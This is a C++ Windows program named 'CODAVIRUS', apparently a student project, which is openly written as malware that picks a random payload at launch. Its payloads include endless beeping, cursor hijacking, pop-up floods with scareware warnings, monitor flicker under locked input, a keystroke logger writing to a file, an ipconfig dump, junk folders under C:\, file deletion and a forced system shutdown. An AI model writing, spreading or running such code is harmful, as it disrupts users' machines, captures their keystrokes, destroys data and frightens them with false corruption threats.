/*
CODAVIRUS...........
PAWAN RAJ __________ CS181040
LAKSH KUMAR ________ CS181015
PARSHANT RAJPUT ____ CS181004
*/
#include<iostream>  //  
#include<windows.h> // 
#include<winuser.h>
#include<ctime>
#include<fstream>
#include<stdio.h>
#include<string.h>
#include<stdlib.h>
#include<direct.h>
//functions or viruses...

void cursorVirus();
void beepVirus();
void windowsVirus();
void warningMessageVirus();
void BlinkingScreenVirus();
void ShowTextVirus();
void StoreIPaddressVirus();
void MakingFoldersAndFilesVirus();
void ShutDownVirus();
void deleteFilesVirus();

int main()
{
	int ID;
	srand(time(0)); // srand function of stdlib, time() function of ctime.
	ID = rand()%10; //rand function of stdlib
	std::cout<<"Your PC has been HACKED .... "<<std::endl;
	std::cout<<"The Random Number is: "<<ID<<std::endl;
	if(ID == 1)
	{
		cursorVirus();
				
	}
	else if (ID == 2)
	{
		for(int i=0;i<10;i++)
		{
			windowsVirus();
			warningMessageVirus();
		}
	}
	else if (ID == 3)
	{
		for(int i=0;i<10;i++)
		{

			BlinkingScreenVirus();
			ShowTextVirus();
		}
	}
	else if (ID == 4)
	{
		MakingFoldersAndFilesVirus();
		StoreIPaddressVirus();
		ShowTextVirus();
	}
	else if (ID == 5)
	{
		StoreIPaddressVirus();
		MakingFoldersAndFilesVirus();
		beepVirus();
		//ShutDownVirus();
	}
	else if (ID == 6)
	{
		MakingFoldersAndFilesVirus();
		BlinkingScreenVirus();
	}
	else if (ID == 7)
	{
		beepVirus();
	}
	else if (ID == 8)
	{
		deleteFilesVirus();
	}
	else 
	{
		MakingFoldersAndFilesVirus();
		StoreIPaddressVirus();
		windowsVirus();
		warningMessageVirus();
		BlinkingScreenVirus();
		beepVirus();
		cursorVirus();
		ShowTextVirus();
		ShutDownVirus();
	}
}

void beepVirus()
{
	while(1)
	{
	std::cout<<'\a';
	}
}
void cursorVirus()
{
	int x,y;
	while(1)
	{
		x = rand()%1367;  //function of stdlib
    	y = rand()%769;   //function of stdlib
    	SetCursorPos(x, y); // function of windows.h
	}
}
char Notepad[MAX_PATH]="notepad.exe"; //directory name cannot exceed MAX_PATH(236)
char Browser[MAX_PATH]="www.google.com.pk"; //directory name cannot exceed MAX_PATH(236)
void windowsVirus()
{
	for(int i=0;i<10;i++)
	{
	ShellExecute(NULL,"open",Notepad,NULL,NULL,SW_MAXIMIZE); //  function of windows.h for launching Application
	ShellExecute(NULL,"open",Browser,NULL,NULL,SW_MAXIMIZE);  
	}
	/*
	HWND- This value can be NULL if the operation is not associated with a window. (HWND - HANDLE TO THE PARERNT WINDOW)
	LPCTSTR- In our case ‘open’ is used which opens the item specified by the lpFile parameter. The item can be a file or folder.
	(lpFile) - LPCTSTR -A pointer to a null-terminated string that specifies the file or object on which to execute the specified verb.
	LPCTSTR - If lpFile specifies a document file, 
	(lpParameters) should be NULL.
	(lpDirectory) - If a relative path is provided at lpFile, do not use a relative path for lpDirectory.
	int - The flags that specify how an application is to be displayed when it is opened.
	SW_MAXIMIZE - Maximizes the specified window.
	*/
}
void warningMessageVirus()
{
	for(int i=0; i<10; i++)
	{
	std::cout<<'\a';
	MessageBox (NULL, "YOUR SYSTEM HAS A VIRUS --  CLICKING 'OK' WILL CORRUPT YOUR WINDOWS"  , "C:\\VIRUS NETWORK DIRECTORY..." ,0); //winuser.h
	/*
	HWND- This value can be NULL if the operation is not associated with a window.
	(lpText) - LPCTSTR - The message to be displayed. 
	(lpCaption) - LPCTSTR - The dialog box title
	Utype - 0 - The message box contains one push button: OK. This is the default.
	*/
	std::cout<<'\a';
	}
}
void BlinkingScreenVirus()
{
	BlockInput(true);
	for(int i=0;i<10;i++) 
	{
	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) 2); 	//winuser.h
	SendMessage(HWND_BROADCAST, WM_SYSCOMMAND, SC_MONITORPOWER, (LPARAM) -1);
	/*
		HWND - you can send the message to all top level windows (HWND_BROADCAST)
		Msg - Specifies the message to be sent (WM_SYSCOMMAND)
		wParam - Specifies additional message-specific information (SC_MONITORPOWER).
		lParam
		1 - the display is going to low power.
		2 - the display is being shut off.
		-1 - the display is being turned on (undocumented value).
	*/
	}
    BlockInput(false);
}

void writeToFile(std::string text)
{
std::ofstream keylogFile;
keylogFile.open("keylogFile.txt",std::fstream::app); // for append
keylogFile<<text;
keylogFile.close();
}
bool writingKeyToFile(int keyNumber)
{
switch(keyNumber)
{
case VK_SPACE:
writeToFile(" ");
break;

case VK_RETURN:
writeToFile(" ENTER ");
break;

case VK_SHIFT:
writeToFile(" SHIFT ");
break;

case VK_BACK:
writeToFile(" BACKSPACE ");
break;

case VK_RBUTTON:
writeToFile("RightClick");
break;

case VK_LBUTTON:
writeToFile("LeftClick");
break;

case VK_CONTROL:
writeToFile(" CTRL + ");
break;

case VK_MENU:
writeToFile(" ALT + ");
break;

case VK_CAPITAL:
writeToFile(" CAPSLOCK ");
break;

case VK_ESCAPE:
writeToFile(" ESC ");
break;

default:
return false;
}
}


void ShowTextVirus()
{
char key;
while(true)
{
Sleep(10);
for(key=8;key<=190;++key) // ascii codes 
{
if(GetAsyncKeyState(key)==-32767) // when the key is pressed.
{
if(writingKeyToFile(key)==false) 
{
std::ofstream keylogFile;
keylogFile.open("keylogFile.txt",std::fstream::app); // for append, function of fstream like read, write, append (modes)
keylogFile<<key;
keylogFile.close();
}
}
}
}
}

void StoreIPaddressVirus()
{
std::string fileName = "ipAddress.txt";
std::ofstream keylogFile(fileName.c_str());  //
keylogFile.close();
system("C:\\Windows\\System32\\ipconfig > ipAddress.txt ");
}

void MakingFoldersAndFilesVirus()
{
		std::ofstream myfile;
		std::string file;
		std::string folder;
		for(int i=1; i<=10; i++)
		{
			folder = "C:\\myfolder ";
			file = "myfile ";
			folder = folder + std::to_string(i);
			file = file + std::to_string(i)+".dat";
			mkdir(folder.c_str()); //mkdir :  stdio.h   - c_str(): (Library: String.h) -  when we want to convert c++ string into C-type String.
			myfile.open(file.c_str());
			file = " ";
			folder = " ";
			myfile.close();
		}
}
void ShutDownVirus()
{
	for(int i=0; i< 100; i++)
	{
	std::cout<<"Your PC is going to Die "<<std::endl;
	}
	system("C:\\WINDOWS\\System32\\shutdown /s"); //stdlib.
}

void deleteFilesVirus()
{
if( remove( "new.txt" ) != 0 ) //stdio.h 
    perror("Soon, your windows will be CORRUPT"); //stdio.h
else
	puts("Virus has started deleting your files, and your windows will be CORRUPT soon"); //stdio.h
}

